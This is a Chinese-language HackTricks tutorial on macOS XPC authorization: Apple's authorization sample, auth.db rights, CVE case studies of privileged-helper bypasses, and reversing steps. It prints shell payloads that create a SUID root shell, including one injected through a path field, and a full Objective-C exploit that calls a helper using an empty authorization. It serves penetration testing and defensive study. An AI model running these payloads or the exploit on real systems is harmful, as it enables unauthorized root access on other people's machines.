# macOS XPC 授权

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC 授权

Apple 还提供了另一种方式，用于验证连接进程是否具有**调用公开 XPC 方法的权限**。<sup>[[2]](#references)</sup>

当应用程序需要**以特权用户身份执行操作**时，通常不会让应用以特权用户身份运行，而是以 root 身份将 HelperTool 安装为 XPC service，供 app 调用以执行这些操作。不过，调用该 service 的 app 应具有足够的授权。

### ShouldAcceptNewConnection 始终为 YES

在 [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) 中可以找到一个示例。在 `App/AppDelegate.m` 中，它尝试**连接**到 **HelperTool**。而在 `HelperTool/HelperTool.m` 中，函数 **`shouldAcceptNewConnection`** **不会检查**之前指出的任何要求。它始终返回 YES：<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
有关如何正确配置此检查的更多信息：

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### 应用程序权限

不过，**调用 HelperTool 中的方法时会进行某些授权检查**。

应用启动后，`App/AppDelegate.m` 中的 **`applicationDidFinishLaunching`** 函数会创建一个空的授权引用。这应该始终能够成功。\
随后，它会调用 `setupAuthorizationRights`，尝试向该授权引用**添加一些权限**：
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m` 中的函数 `setupAuthorizationRights` 会将应用程序的 rights 存储到 auth database `/var/db/auth.db` 中。注意，它只会添加数据库中尚不存在的 rights：
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
函数 `enumerateRightsUsingBlock` 用于获取应用程序权限，这些权限定义在 `commandInfo` 中：
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
这意味着，在此流程结束时，`commandInfo` 中声明的权限将存储在 `/var/db/auth.db` 中。对于**每个需要身份验证**的方法，数据库都会包含**权限名称**和 **`kCommandKeyAuthRightDefault`**。后者**表示谁可以获得此权限**。<sup>[[1]](#references)</sup>

有不同的 scope 用于表示谁可以访问某项权限。其中一些定义在 [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) 中（你可以在[这里找到全部定义](https://www.dssw.co.uk/reference/authorization-rights/)），总结如下：<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">名称</th><th width="165">值</th><th>描述</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>任何人</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>无人</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>当前用户必须是管理员（属于 admin 组）</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>要求用户进行身份验证。</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>要求用户进行身份验证。用户必须是管理员（属于 admin 组）</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>指定规则</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>指定有关该权限的额外注释</td></tr></tbody></table>

### 权限验证

在 `HelperTool/HelperTool.m` 中，函数 **`readLicenseKeyAuthorization`** 通过调用 **`checkAuthorization`** 函数，检查调用者是否有权**执行此方法**。此函数会检查调用进程发送的 **authData** 是否具有**正确的格式**，然后检查获得调用特定方法所需的**权限**需要满足什么条件。如果一切正常，**返回的 `error` 将为 `nil`**：
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
要**检查获取调用该方法权限的要求**，`authorizationRightForCommand` 会检查前面提到的 **`commandInfo`** 对象。随后，它调用 **`AuthorizationCopyRights`** 来检查**调用者是否拥有调用该函数的权限**（注意，这些 flags 允许与用户交互）。<sup>[[1]](#references)[[3]](#references)</sup>

在此情况下，要调用函数 `readLicenseKeyAuthorization`，`kCommandKeyAuthRightDefault` 被定义为 `@kAuthorizationRuleClassAllow`。因此，**任何人都可以调用它**。

### DB 信息

前面提到，这些信息存储在 `/var/db/auth.db` 中。你可以使用以下命令列出所有已存储的规则：
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
然后，你可以通过以下方式读取哪些用户可以访问该权限：
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 宽松权限

你可以[**在这里**](https://www.dssw.co.uk/reference/authorization-rights/)找到**所有权限配置**，但不会要求用户交互的组合包括：<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- 这是最直接的键。如果设置为 `false`，则表示用户无需提供身份验证即可获得此权限。
- 这会与下面两个键之一**结合使用，或用于指定用户必须属于的组**。
2. **'allow-root': 'true'**
- 如果用户以 root 用户身份运行（该用户拥有提升的权限），并且此键设置为 `true`，则 root 用户可能无需进一步身份验证即可获得此权限。不过，通常情况下，获得 root 用户身份本身就需要身份验证，因此对于大多数用户来说，这并不是“无需身份验证”的场景。
3. **'session-owner': 'true'**
- 如果设置为 `true`，会话所有者（当前登录的用户）将自动获得此权限。如果用户已经登录，这可能会绕过额外的身份验证。
4. **'shared': 'true'**
- 此键不会在没有身份验证的情况下授予权限。相反，如果设置为 `true`，则表示该权限完成身份验证后，可以在多个进程之间共享，而无需每个进程重新进行身份验证。但除非与 `'authenticate-user': 'false'` 等其他键结合使用，否则首次授予该权限仍需要身份验证。

你可以[**使用此脚本**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)来获取有趣的权限：
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass 案例研究

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**：特权 Mach service `com.acustica.HelperTool` 接受每个连接，其 `checkAuthorization:` routine 调用 `AuthorizationCopyRights(NULL, …)`，因此任意 32 字节 blob 都能通过验证。随后，`executeCommand:authorization:withReply:` 将攻击者控制的逗号分隔字符串作为 root 传入 `NSTask`，从而允许使用如下 payload：
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
可轻松创建 SUID root shell。详情请参阅[这篇 write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)。<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**：listener 始终返回 YES，并且 `checkAuthorization:` 中也出现了相同的 NULL `AuthorizationCopyRights` 模式。方法 `exchangeAppWithReply:` 两次将攻击者输入拼接到 `system()` 字符串中，因此在 `appPath` 中注入 shell metacharacters（例如 `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`）即可通过 Mach service `com.plugin-alliance.pa-installationhelper` 执行 root code。更多信息请参阅[此处](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)。<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**：运行 audit 会创建 `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`，暴露 Mach service `com.jamf.complianceeditor.helper`，并导出 `-executeScriptAt:arguments:then:`，却不验证调用者的 `AuthorizationExternalForm` 或 code signature。一个简单的 exploit 可以 `AuthorizationCreate` 一个空 reference，使用 `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` 进行连接，然后调用该方法，以 root 身份执行任意 binaries。完整的 reversing notes（以及 PoC）请参阅 [Mykola Grymalyuk 的 write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)。<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**：FortiClient Mac 7.0.0–7.0.14、7.2.0–7.2.8 和 7.4.0–7.4.2 接受了 crafted XPC messages，并使其到达缺少 authorization gates 的 privileged helper。由于该 helper 信任自身的 privileged `AuthorizationRef`，任何能够向该 service 发送消息的本地用户，都可以诱使其以 root 身份执行任意 configuration changes 或 commands。详情请参阅 [SentinelOne 的 advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)。<sup>[[5]](#references)</sup>

#### Rapid triage tips

- 当 app 同时提供 GUI 和 helper 时，对比它们的 code requirements，并检查 `shouldAcceptNewConnection` 是否使用 `-setCodeSigningRequirement:` 锁定 listener（或验证 `SecCodeCopySigningInformation`）。缺少这些检查通常会导致类似 Jamf 案例中的 CWE-863 场景。快速查看结果类似于：
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- 对比 helper *认为自己正在授权的内容* 与 client 提供的内容。在 reversing 时，在 `AuthorizationCopyRights` 处设置断点，并确认 `AuthorizationRef` 源自 `AuthorizationCreateFromExternalForm`（由 client 提供），而不是 helper 自身的 privileged context；否则，你很可能发现了类似上述案例的 CWE-863 pattern。

## Reversing Authorization

### Checking if EvenBetterAuthorization is used

如果找到函数：**`[HelperTool checkAuthorization:command:]`**，那么该 process 很可能使用了前面提到的 authorization schema：

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

如果该函数调用了 `AuthorizationCreateFromExternalForm`、`authorizationRightForCommand`、`AuthorizationCopyRights` 和 `AuthorizationFree` 等 API，则说明它使用的是 [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) pattern。

检查 **`/var/db/auth.db`**，确认是否可以在不与用户交互的情况下获得调用某些 privileged action 的权限。

### Protocol Communication

接下来，你需要找到 protocol schema，才能与 XPC service 建立通信。

函数 **`shouldAcceptNewConnection`** 表示被导出的 protocol：

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

在本例中，它与 EvenBetterAuthorizationSample 中的相同，[**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)。

知道所使用的 protocol 名称后，可以使用以下命令 **dump its header definition**：
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
最后，我们只需要知道暴露的 **Mach Service 名称**，即可与其建立通信。有几种方法可以找到它：

- 在 **`[HelperTool init]`** 中，可以看到正在使用的 Mach Service：

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- 在 launchd plist 中：
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

在此示例中创建了：

- 包含各个函数的 protocol 定义
- 用于请求访问权限的空 auth
- 与 XPC service 的连接
- 如果连接成功，则调用该函数
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 其他被滥用的 XPC 权限辅助工具

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## References

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395：Jamf Compliance Editor 权限提升](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251：FortiClient Mac 权限提升漏洞](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – macOS 上 Aquarius Desktop 中 Acustica Audio HelperTool XPC Service 本地权限提升](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Plugin Alliance InstallationHelper XPC Service 本地权限提升](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805：Apple EndpointSecurity framework 权限提升（SecureLayer7）](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Authorization Rights Reference（dssw.co.uk）](https://www.dssw.co.uk/reference/authorization-rights/)
{{#include ../../../../../banners/hacktricks-training.md}}
